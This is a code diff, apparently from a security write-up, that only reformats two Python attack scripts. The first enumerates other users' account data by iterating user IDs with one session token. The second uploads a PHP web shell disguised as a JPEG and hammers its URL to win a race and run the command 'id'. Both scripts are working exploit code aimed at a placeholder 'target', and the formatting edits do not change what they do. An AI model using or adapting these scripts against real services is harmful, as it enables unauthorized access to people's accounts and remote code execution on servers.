@@ -751,8 +751,7 @@ S_A = requests.Session()
 S_A.cookies.set("token", "TOKEN_A_VALID")
 
 for victim_uid in range(10000, 10010):
-    r = S_A.get(f"https://target/api/account/info",
-                params={"uid": victim_uid})
+    r = S_A.get(f"https://target/api/account/info", params={"uid": victim_uid})
     print(victim_uid, r.status_code, r.text[:200])
 ```
 
@@ -893,17 +892,21 @@ import requests, threading, time
 UPLOAD = "https://target/api/upload"
 ACCESS = "https://target/uploads/{}/shell.php"
 
+
 def upload(i):
     files = {"file": ("shell.php", "<?php system($_GET[0]); ?>", "image/jpeg")}
     r = requests.post(UPLOAD, files=files, cookies={"session": "..."})
     return r.json().get("path")
+
 
 def hammer_access(path):
     deadline = time.time() + 10
     while time.time() < deadline:
         r = requests.get(ACCESS.format(path), params={"0": "id"})
         if "uid=" in r.text:
-            print("HIT", path); break
+            print("HIT", path)
+            break
+
 
 paths = [upload(i) for i in range(20)]
 for p in paths:
